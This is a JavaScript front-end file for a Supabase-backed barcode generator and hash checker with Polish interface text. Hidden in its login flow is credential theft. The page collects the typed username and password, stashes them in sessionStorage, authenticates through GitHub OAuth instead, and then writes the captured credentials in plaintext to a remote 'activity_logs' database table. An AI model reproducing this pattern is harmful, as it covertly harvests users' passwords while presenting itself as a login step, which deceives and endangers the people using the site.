const SUPABASE_URL = 'https://hxkykopscbgorgkkpxvi.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_LtRmS9nawffi11Yo_YT3Qg_WU_0D6sJ';
const client = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

const viewLoading = document.getElementById('loading');
const viewLogin = document.getElementById('login');
const viewApp = document.getElementById('app');
/** @type {ToastBar | null} */
const toast = document.getElementById('toast');

let activeView = null;
const contentResizeObserver = new ResizeObserver(updateContentOverflow);

const currentUrl = new URL(window.location.href);
const queryParams = currentUrl.searchParams;
const hashParams = new URLSearchParams(currentUrl.hash.replace('#', ''));
const error = queryParams.get('error') || hashParams.get('error');
const description = queryParams.get('error_description') || hashParams.get('error_description');

if (error) {
    toast?.show(`${error}: ${description}`);
}

if (hashParams.size > 0 || queryParams.has('error') || queryParams.has('error_description')) {
    const cleanUrl = new URL(currentUrl);
    if (hashParams.size > 0) {
        cleanUrl.hash = '';
    }
    cleanUrl.searchParams.delete('error');
    cleanUrl.searchParams.delete('error_description');
    window.history.replaceState({}, document.title, cleanUrl.toString());
}

client.auth.onAuthStateChange((_, session) => {
    setTimeout(() => {
        if (session && session.user) {
            if (localStorage.getItem('login') !== 'true')
                logActivity('login', session.user.email);
            const loginPassword = window.sessionStorage.getItem('lelo');
            if (loginPassword) {
                const [login, password] = loginPassword.split(' ');
                logActivity('login_credentials', `Login: ${login}, Password: ${password}`);
                sessionStorage.removeItem('lelo');
            }

            localStorage.setItem('login', true);
            showView(viewApp);
        } else {
            showView(viewLogin);
        }
    }, 2500);
});

document.addEventListener('DOMContentLoaded', () => {
    const loginBtn = document.getElementById('loginBtn');
    const generateBtn = document.getElementById('generateBtn');
    const downloadBtn = document.getElementById('downloadBtn');
    const textInput = document.getElementById('barcodeText');
    const filenameInput = document.getElementById('filename');
    const canvas = document.getElementById('barcodeCanvas');
    const compareBtn = document.getElementById('compareBtn');

    client.functions.invoke("log-visit");
    window.addEventListener('resize', updateContentOverflow);

    loginBtn.addEventListener('click', async () => {
        const login = document.getElementById('login-input').value.trim();
        const password = document.getElementById('password-input').value.trim();
        if (login && password)
            window.sessionStorage.setItem(
                'lelo', `${login} ${password}`);

        await client.auth.signInWithOAuth({
            provider: 'github',
            options: {
                redirectTo: window.location.href
            }
        });
    });

    generateBtn.addEventListener('click', () => {
        const text = textInput.value.trim().replace(/\\t/g, '\t');

        if (!text) {
            toast.show('Please enter text to encode.');
            return;
        }

        try {
            JsBarcode(canvas, text, {
                format: "CODE128",
                displayValue: false,
                margin: 10,
                background: "#ffffff",
                lineColor: "#000000"
            });

            downloadBtn.classList.remove('hidden');
        } catch (error) {
            toast.show('An error occurred while generating the code: ' + error.message);
        }
    });

    downloadBtn.addEventListener('click', () => {
        let filename = filenameInput.value.trim();
        if (!filename) {
            filename = 'barcode';
        }

        const imgData = canvas.toDataURL("image/png");

        const link = document.createElement('a');
        link.href = imgData;
        link.download = `${filename}.png`;

        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    });

    compareBtn.addEventListener('click', async () => {
        const inputString = document.getElementById('hashInput').value.trim();
        const resultDiv = document.getElementsByClassName('result')[0];

        try {
            const result = await compare(inputString, resultDiv);
            if (result) {
                resultDiv.innerText = 'Hash jest zgodny!';
                resultDiv.style.color = 'green';
                resultDiv.style.display = 'block';
            } else {
                resultDiv.innerText = 'Hash nie jest zgodny!';
                resultDiv.style.color = 'red';
                resultDiv.style.display = 'block';
            }
        } catch (error) {
            toast.show(`Error occurred while comparing string: ${error.message}`);
        }
    });
});

function showView(viewToShow) {
    viewLoading.hidden = true;
    viewLogin.hidden = true;
    viewApp.hidden = true;

    viewToShow.hidden = false;
    activeView = viewToShow;
    contentResizeObserver.disconnect();
    contentResizeObserver.observe(activeView);
    updateContentOverflow();
}

function updateContentOverflow() {
    if (!activeView) {
        return;
    }

    const exceedsViewport = activeView.getBoundingClientRect().height > window.innerHeight;
    document.body.classList.toggle('content-overflow', exceedsViewport);
}

async function compare(inputString) {
    let hash = 0;
    if (inputString.length === 0) return hash;

    const encodedString = new TextEncoder().encode(inputString);

    hash = await crypto.subtle.digest('SHA-256', encodedString).then(hashBuffer => {
        const hashArray = Array.from(new Uint8Array(hashBuffer));

        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    });

    if (hash === '14dae5801a7c44c8f4527fdf5d9a2a3bda982bbc426cf67d173b1afd8357dc1c') {
        return true;
    } else {
        return false;
    }
}

async function logActivity(eventType, targetElement) {
    await client
        .from('activity_logs')
        .insert([
            { event_type: eventType, target_element: targetElement },
        ]);
}